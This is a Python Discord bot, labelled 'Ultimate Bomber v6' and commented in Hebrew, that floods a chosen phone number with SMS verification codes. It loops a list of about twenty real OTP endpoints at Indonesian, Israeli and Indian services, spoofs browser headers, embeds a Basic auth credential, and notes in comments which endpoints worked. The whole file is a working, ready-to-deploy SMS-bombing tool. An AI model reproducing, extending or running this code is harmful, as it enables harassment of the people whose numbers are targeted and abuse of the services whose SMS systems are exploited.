import discord
from discord.ext import commands
import aiohttp
import asyncio
import os
import random
import json

# ==================== CONFIG ====================
TOKEN = os.getenv("BOT_TOKEN")
intents = discord.Intents.default()
intents.message_content = True 

# ==================== THE COMPLETE API LIST FROM FILE ====================
ALL_APIs = [
    # --- APIs שעבדו ב-200 (לפי הלוג שלך) ---
    {"name": "Shopee", "url": "https://shopee.co.id/api/v4/otp/send_vcode", "method": "POST", "json": {"phone": "{{phone}}", "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1,2,3]}},
    {"name": "RupiahCepat", "url": "https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code", "method": "POST", "data": {"data": '{"mobile_no": "{{phone}}"}'}},
    {"name": "Klikwa", "url": "https://api.klikwa.net/v1/number/sendotp", "method": "POST", "headers": {"Authorization": "Basic QjMzOkZSMzM="}, "json": {"phone": "{{phone}}"}},
    {"name": "Redbus", "url": "https://m.redbus.id/api/getOtp?number={{phone}}", "method": "GET"},
    {"name": "ICQ", "url": "https://u.icq.net/api/v14/rapi/auth/sendCode", "method": "POST", "json": {"params": {"phone": "62{{phone_no_zero}}", "language": "en-US", "route": "sms", "application": "icq"}}},
    {"name": "Adakami", "url": "https://api.adakami.id/adaKredit/pesan/kodeVerifikasi", "method": "POST", "json": {"ketik": 0, "nomor": "0{{phone_no_zero}}"}},
    {"name": "Matahari", "url": "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", "method": "POST", "json": {"otp_request": {"mobile_number": "{{phone}}", "mobile_country_code": "+62"}}},
    {"name": "Mishloha", "url": "https://www.mishloha.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Pinjamindo", "url": "https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62{{phone_no_zero}}", "method": "GET"},

    # --- תיקוני שגיאות מהלוג (400, 404, 405) ---
    {"name": "Jumpstart", "url": "https://api.jumpstart.id/graphql", "method": "POST", "json": {"operationName": "CheckPhoneNoAndGenerateOtpIfNotExist", "variables": {"phoneNo": "{{phone}}"}, "query": "mutation CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"}},
    {"name": "Ktbs", "url": "https://core.ktbs.io/v2/user/registration/otp/{{phone}}", "method": "POST", "json": {}}, # שיניתי מ-GET ל-POST כי 400 בדרך כלל אומר חוסר ב-Body
    {"name": "Asani", "url": "https://api.asani.co.id/api/v1/send-otp", "method": "POST", "json": {"phone": "62{{phone_no_zero}}", "email": "testuser@gmail.com"}},
    {"name": "Coowry", "url": "https://www.coowry.com/api/tokens", "method": "POST", "headers": {"Content-Type": "application/json"}, "json": {"msisdn": "+62{{phone_no_zero}}"}},
    {"name": "ConfirmTkt", "url": "https://securedapi.confirmtkt.com/api/platform/register", "method": "POST", "params": {"mobileNumber": "{{phone}}"}}, # תיקון ל-404 על ידי הורדת הפרמטר מה-URL ל-Params

    # --- APIs נוספים מהקובץ ---
    {"name": "Payfazz", "url": "https://api.payfazz.com/v2/phoneVerifications", "method": "POST", "json": {"phone": "0{{phone_no_zero}}"}},
    {"name": "Ruparupa", "url": "https://wapi.ruparupa.com/auth/generate-otp", "method": "POST", "json": {"phone": "0{{phone_no_zero}}", "action": "register", "channel": "message"}},
    {"name": "Sociolla", "url": "https://soco-api.sociolla.com/auth/otp/code", "method": "POST", "json": {"mode": "sms", "entity": "0{{phone_no_zero}}"}},
    {"name": "KlikIndomaret", "url": "https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS", "method": "GET", "params": {"NoHP": "{{phone}}"}},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": "{{phone}}", "type": "phone", "projectId": "1"}},
    {"name": "Oyo", "url": "https://www.oyorooms.com/api/pwa/generateotp", "method": "GET", "params": {"phone": "{{phone}}", "country_code": "+62"}}
]

active_bombs = {}

# ==================== ENGINE ====================
async def run_attack(session, api, phone, user_id):
    if active_bombs.get(user_id) is False: return
    
    no_zero = phone[1:] if phone.startswith('0') else phone
    
    # פונקציית עזר להחלפת טקסט בתוך הנתונים
    def fix_val(obj):
        if isinstance(obj, dict): return {k: fix_val(v) for k, v in obj.items()}
        if isinstance(obj, str): return obj.replace("{{phone}}", phone).replace("{{phone_no_zero}}", no_zero)
        return obj

    url = api["url"].replace("{{phone}}", phone).replace("{{phone_no_zero}}", no_zero)
    payload = fix_val(api.get("json"))
    form_data = fix_val(api.get("data"))
    params = fix_val(api.get("params"))
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Accept": "application/json",
        "Origin": "https://google.com"
    }
    if api.get("headers"): headers.update(api["headers"])

    try:
        async with session.request(api["method"], url, json=payload, data=form_data, params=params, headers=headers, timeout=12) as r:
            print(f"[{api['name']}] Status: {r.status}")
    except Exception as e:
        # print(f"[{api['name']}] Error: {e}") # פתח את זה לדיבאג אם צריך
        pass

# ==================== DISCORD INTERFACE ====================
class BomberModal(discord.ui.Modal, title='🔥 Ultimate Bomber v6'):
    phone = discord.ui.TextInput(label='מספר יעד', placeholder='05XXXXXXXX', min_length=10, max_length=10)
    rounds = discord.ui.TextInput(label='כמות סבבים', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        target = self.phone.value
        user_id = interaction.user.id
        active_bombs[user_id] = True
        
        await interaction.response.send_message(f"💣 מתחיל הפצצה על {target} עם {len(ALL_APIs)} APIs.", ephemeral=True)
        
        async with aiohttp.ClientSession() as session:
            for _ in range(int(self.rounds.value)):
                if active_bombs.get(user_id) is False: break
                tasks = [run_attack(session, api, target, user_id) for api in ALL_APIs]
                await asyncio.gather(*tasks)
                await asyncio.sleep(1.5)
        
        active_bombs.pop(user_id, None)

class ControlView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="🚀 התחל", style=discord.ButtonStyle.danger)
    async def start(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BomberModal())
    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_bombs[interaction.user.id] = False
        await interaction.response.send_message("ההפצצה הופסקה.", ephemeral=True)

class MyBot(commands.Bot):
    def __init__(self): super().__init__(command_prefix='!', intents=intents)
    async def setup_hook(self): await self.tree.sync()

bot = MyBot()

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    await interaction.response.send_message("לוח בקרה מעודכן (v6)", view=ControlView())

bot.run(TOKEN)
